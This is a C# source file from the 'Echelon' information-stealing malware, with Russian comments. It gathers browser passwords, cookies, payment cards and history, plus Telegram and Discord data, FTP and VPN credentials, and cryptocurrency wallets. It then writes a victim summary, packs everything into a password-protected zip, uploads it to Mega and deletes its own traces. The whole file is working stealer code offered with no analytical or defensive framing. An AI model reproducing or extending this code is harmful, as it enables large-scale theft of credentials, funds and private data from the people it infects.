

using System;
using System.IO;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Echelon.Global;

using Ionic.Zip;
using Ionic.Zlib;
using ChromV2;
using ChromV1;

namespace Echelon
{

    public static class Collection
    {
        [STAThread]
        public static void GetChromium()
        {
            try
            {
                Chromium.Set(Help.HWID);
                Chromium.GetCards(Help.Cards);
                Chromium.GetCookies(Help.Cookies);
                Chromium.GetPasswords(Help.Passwords);
                Chromium.GetAutofills(Help.Autofills);
                Chromium.GetDownloads(Help.Downloads);
                Chromium.GetHistory(Help.History);
                Chromium.GetPasswordsOpera(Help.Passwords);
                Chromium.GetCookiesOpera(Help.Cookies);
            }
            catch { }
        }

        public static void GetGecko()
        {
            try
            {
                Steal.Cookies();
                Steal.Passwords();
            }
            catch { }
        }

        public static void GetCollection()
        {
            try
            {
                // Создаем временные директории для сбора лога
                Directory.CreateDirectory(Help.collectionDir);
                Directory.CreateDirectory(Help.Browsers);
                Directory.CreateDirectory(Help.Passwords);
                Directory.CreateDirectory(Help.Autofills);
                Directory.CreateDirectory(Help.Downloads);
                Directory.CreateDirectory(Help.Cookies);
                Directory.CreateDirectory(Help.History);
                Directory.CreateDirectory(Help.Cards);
            }
            catch { }
            var t0 = new Task[1] { new Task(() => Files.GetFiles(Help.collectionDir))};
            var t1 = new Task[1] { new Task(() => GetChromium())};
            var t2 = new Task[1] { new Task(() => GetGecko())};
            var t3 = new Task[1] { new Task(() => Edge.GetEdge(Help.Passwords))};
            var t4 = new Task[1] { new Task(() => Outlook.GrabOutlook(Help.collectionDir))};
            var t5 = new Task[1] { new Task(() => FileZilla.GetFileZilla(Help.collectionDir))};
            var t6 = new Task[1] { new Task(() => TotalCommander.GetTotalCommander(Help.collectionDir))};
            var t7 = new Task[1] { new Task(() => ProtonVPN.GetProtonVPN(Help.collectionDir))};
            var t8 = new Task[1] { new Task(() => OpenVPN.GetOpenVPN(Help.collectionDir))};
            var t9 = new Task[1] { new Task(() => NordVPN.GetNordVPN(Help.collectionDir))};
            var t10 = new Task[1] { new Task(() => Telegram.GetTelegram(Help.collectionDir))};
            var t11 = new Task[1] { new Task(() => Discord.GetDiscord(Help.collectionDir))};
            var t12 = new Task[1] { new Task(() => Wallets.GetWallets(Help.collectionDir))};
            var t13 = new Task[1] { new Task(() => Systemsinfo.GetSystemsData(Help.collectionDir))};
            var t14 = new Task[1] { new Task(() => DomainDetect.GetDomainDetect(Help.Browsers))};
            var t15 = new Task[1] { new Task(() => Dec.Decrypt(Help.Passwords)) };
            try
            {
                new Thread(() => { foreach (var t in t0) t.Start(); }).Start();
                new Thread(() => { foreach (var t in t1) t.Start(); }).Start();
                new Thread(() => { foreach (var t in t2) t.Start(); }).Start();
                new Thread(() => { foreach (var t in t3) t.Start(); }).Start();
                new Thread(() => { foreach (var t in t4) t.Start(); }).Start();
                new Thread(() => { foreach (var t in t5) t.Start(); }).Start();
                new Thread(() => { foreach (var t in t6) t.Start(); }).Start();
                new Thread(() => { foreach (var t in t7) t.Start(); }).Start();
                new Thread(() => { foreach (var t in t8) t.Start(); }).Start();
                new Thread(() => { foreach (var t in t9) t.Start(); }).Start();
                new Thread(() => { foreach (var t in t10) t.Start(); }).Start();
                new Thread(() => { foreach (var t in t11) t.Start(); }).Start();
                new Thread(() => { foreach (var t in t12) t.Start(); }).Start();
                new Thread(() => { foreach (var t in t13) t.Start(); }).Start();
                new Thread(() => { foreach (var t in t14) t.Start(); }).Start();
                new Thread(() => { foreach (var t in t15) t.Start(); }).Start();

                Task.WaitAll(t0);
                Task.WaitAll(t1);
                Task.WaitAll(t2);
                Task.WaitAll(t3);
                Task.WaitAll(t4);
                Task.WaitAll(t5);
                Task.WaitAll(t6);
                Task.WaitAll(t7);
                Task.WaitAll(t8);
                Task.WaitAll(t9);
                Task.WaitAll(t10);
                Task.WaitAll(t11);
                Task.WaitAll(t12);
                Task.WaitAll(t13);
                Task.WaitAll(t14);
                Task.WaitAll(t15);


            }
            catch { }
            var data = Program.buildversion +
                       "\n👤 " + Help.machineName + "/" + Help.userName +
                       "\n🏴 IP: " + Help.IP() + Help.Country() +
                       "\n🌐 Browsers Data" +
                       "\n   ∟🔑" + 
                       "\n     ∟" + "Chromium v1: " + Chromium.Passwords +
                       "\n     ∟" + "Chromium v2: " + Dec.colvo +
                       "\n     ∟" + "Edge: " + Edge.count +
                       "\n     ∟" + "Gecko: " + Steal.count +
                       "\n   ∟🍪" + (Chromium.Cookies + Steal.count_cookies) +
                       "\n   ∟🕑" + Chromium.History +
                       "\n   ∟📝" + Chromium.Autofills +
                       "\n   ∟💳" + Chromium.CC +
                       "\n   ∟⨭" + Chromium.Downloads +
                       "\n💶 Wallets: " + (Wallets.count > 0 ? "✅" : "❌") +
                       (Electrum.count > 0 ? " Electrum" : "") +
                       (Armory.count > 0 ? " Armory" : "") +
                       (AtomicWallet.count > 0 ? " Atomic" : "") +
                       (BitcoinCore.count > 0 ? " BitcoinCore" : "") +
                       (Bytecoin.count > 0 ? " Bytecoin" : "") +
                       (DashCore.count > 0 ? " DashCore" : "") +
                       (Ethereum.count > 0 ? " Ethereum" : "") +
                       (Exodus.count > 0 ? " Exodus" : "") +
                       (LitecoinCore.count > 0 ? " LitecoinCore" : "") +
                       (Monero.count > 0 ? " Monero" : "") +
                       (Zcash.count > 0 ? " Zcash" : "") +
                       (Jaxx.count > 0 ? " Jaxx" : "") +

                       "\n📂 FileGrabber: " + Files.count + //Работает
                       "\n💬 Discord: " + (Discord.count > 0 ? "✅" : "❌") + //Работает
                       "\n✈️ Telegram: " + (Telegram.count > 0 ? "✅" : "❌") + //Работает
                       "\n💡 Jabber: " + (Startjabbers.count + Pidgin.PidginCount > 0 ? "✅" : "❌") +
                       (Pidgin.PidginCount > 0 ? " Pidgin (" + Pidgin.PidginAkks + ")" : "") +
                       (Startjabbers.count > 0 ? " Psi" : "") + //Работает

                       "\n📡 FTP" +
                       "\n   ∟ FileZilla: " + (FileZilla.count > 0 ? "✅" + " (" + FileZilla.count + ")" : "❌") + //Работает
                       "\n   ∟ TotalCmd: " + (TotalCommander.count > 0 ? "✅" : "❌") + //Работает
                       "\n🔌 VPN" +
                       "\n   ∟ NordVPN: " + (NordVPN.count > 0 ? "✅" : "❌") + //Работает
                       "\n   ∟ OpenVPN: " + (OpenVPN.count > 0 ? "✅" : "❌") + //Работает
                       "\n   ∟ ProtonVPN: " + (ProtonVPN.count > 0 ? "✅" : "❌") + //Работает
                       "\n🆔 HWID: " + Help.HWID + //Работает
                       "\n⚙️ " + Systemsinfo.GetOSInformation() +
                       "\n🔎 " + File.ReadAllText(Help.Browsers + "\\DomainDetect.txt");
            File.WriteAllText(Help.collectionDir + "\\" + "InfoHERE.txt", data);

            // Пакуем в апхив с паролем
            var zipArchive = Help.dir + "\\" + Help.userName + "_" + Help.machineName + Help.CountryCOde() + ".zip";
            using (var zip = new ZipFile(Encoding.GetEncoding("cp866"))) // Устанавливаем кодировку
            {
                zip.ParallelDeflateThreshold = -1;
                zip.UseZip64WhenSaving = Zip64Option.Always;
                zip.CompressionLevel = CompressionLevel.Default; // Задаем степень сжатия 
                zip.Password = Program.passwordzip; // Задаём пароль
                zip.AddDirectory(Help.collectionDir); // Кладем в архив содержимое папки с логом
                try { zip.Save(zipArchive); }
                catch
                {
                    zipArchive = Help.dir + "\\" + Help.HWID + ".zip";
                    zip.Save(zipArchive);
                }
            }
            MegaSend.Send(zipArchive); //отправка в мегу
            Clean.GetClean(); // удаление папки со стиллером
        }
    }
}